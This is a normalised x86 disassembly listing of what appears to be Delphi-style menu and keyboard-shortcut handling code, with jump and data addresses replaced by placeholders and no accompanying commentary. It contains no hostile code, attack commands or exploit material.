mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x25 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_434458
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404edc
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_434421
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4333e4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_404edc
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x34 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43445f
lea eax [ ebp - 0x44 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
call sub_434610
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x34 ] eax
inc esi
dec [ ebp - 0x34 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4333f4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_405270
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x26 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_433dcc
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4333f4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4333f4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f64
mov eax [ ebp - 0x2c ]
call sub_403f64
mov eax [ ebp - 0x14 ]
call sub_403f64
mov eax [ ebp - 0xc ]
call sub_403f64
retn
inc eax
mov [ ebp - 0x34 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_433dcc
pop ecx
mov eax [ ebp - 0x20 ]
call sub_405120
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4333f4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x38 ]
call sub_4361c8
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x1c ]
call sub_409048
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x20 ]
call sub_404e98
inc esi
dec [ ebp - 0x34 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_40e924
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x1c ]
call sub_40e924
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4333f4
push eax
mov edx esi
mov eax ebx
call sub_4333f4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x34 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x40 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_405384
mov eax [ ebp - 0x40 ]
lea edx [ ebp - 0x1c ]
call sub_409048
push ebp
mov eax [ ebp - 0x1c ]
call sub_433d9c
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x1c ]
call sub_433d9c
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_40e924
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
call sub_404edc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ebx eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx ebx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4333f4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_4333f4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_4360d8
mov edx [ ebp - 0x3c ]
pop eax
call sub_404e98
mov edx esi
mov eax ebx
call sub_4333f4
push eax
mov edx esi
mov eax ebx
call sub_4333f4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov edi [ eax ]
call [ edi + 0x64 ]
mov ebx [ ebp - 0x18 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20 ]
mov ecx ebx
mov eax r-xdata
call sub_40540c
lea eax [ ebp - 0x20 ]
mov ecx ebx
mov edx [ ebp - 0x1c ]
call sub_433e50
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x18 ]
call sub_405384
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_433e50
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
xchg edx eax
call sub_4053c4
sub eax 0x4
mov eax [ eax ]
sub_4344b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4333e4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4333e4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
movzx eax [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_434640
test al al
je r-xdata
mov eax esi
call sub_4333e4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
call sub_434494
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_4333f4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
call sub_434494
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4333f4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_4333f4
call sub_434494
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_434610
push ebx
mov ebx eax
movzx eax [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_434610
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_434640
push ebx
mov ebx eax
movzx eax [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_434640
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_434670
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_431264
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41da5c
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_435620
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_43471c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403f64
mov eax [ esi + 0x44 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_434790
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_434790
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_430dcc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4337ec
mov eax ebx
pop esi
pop ebx
retn
sub_4347d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_4333e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_4333f4
call sub_4347d0
pop ecx
test al al
je r-xdata
sub_434868
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4347d0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_430dcc
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_434898
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_434868
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_435e3c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_434908
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_434868
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_434924
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_434868
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_433fd0
mov ebx eax
xor edx edx
mov eax edi
call sub_4344b8
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_433910
mov eax [ esi + 0x34 ]
call sub_433910
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_431768
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
cmp edi [ ebx + 0x2a0 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x29c ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_443be8
push eax
call DrawMenuBar
sub_434a00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434b33
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x16 ] 0x0
lea eax [ ebp - 0x16 ]
push eax
call GetKeyboardLayoutNameA
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_434b09
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx 0x80000002
mov eax [ ebp - 0xc ]
call sub_420e5c
lea eax [ ebp - 0x20 ]
lea edx [ ebp - 0x16 ]
mov ecx 0xa
call sub_4050b4
mov ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_420fe8
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_421600
mov edx 0x8000
mov eax [ ebp - 0x4 ]
call sub_40f988
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_434aec
push [ fs : edx ]
mov [ fs : edx ] esp
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call GetProcAddress
mov ebx eax
call ebx
movzx eax [ eax + 0x28 ]
and ax 0x1
cmp ax 0x1
sete [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434af3
mov eax [ ebp - 0x8 ]
push eax
call FreeLibrary
retn
sub_434ba4
push ebx
xor ebx ebx
push 0xa5
call GetKeyState
test ax ax
jge r-xdata
mov eax ebx
pop ebx
retn
push 0x0
call GetKeyboardLayout
mov ebx eax
cmp ebx [ rw-data ]
je r-xdata
movzx ebx [ rw-data ]
call sub_434a00
mov [ rw-data ] ebx
sub_434be0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
test bx bx
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add bx 0x2000
test [ esp + 0xb ] 0x20
je r-xdata
add bx 0x4000
add bx 0x8000
sub_434c40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_434c40
pop ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_434d66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_434868
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_433910
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_434c30
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_434d94
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov [ ebp - 0xc ] eax
xor ebx ebx
call sub_434ba4
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_434be0
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_41ef18
xor eax eax
push ebp
push sub_434e67
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ef18
xor eax eax
push ebp
push sub_434e3c
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_434c40
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41ef10
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e6e
mov eax [ rw-data ]
call sub_41ef10
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_434868
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_434e6e
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov bl 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434e90
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_435224
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_435224
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_434f4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_435554
mov eax ebx
call sub_40a320
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
mov edi eax
test di 0x2
je r-xdata
test di 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test di 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_434ff8
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_434f4c
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4050b4
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_405324
lea edx [ ebp - 0x200 ]
call sub_40a3f8
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_43508c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_435100
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4355fc
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4355fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4355fc
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_43510c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_434ff8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_43508c
mov eax ebx
call sub_435620
jmp r-xdata
sub_435174
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
movzx ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4351bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44a5d8
mov eax ebx
call sub_4347b8
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44a61c
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41db30
sub_4351f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41dd8c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
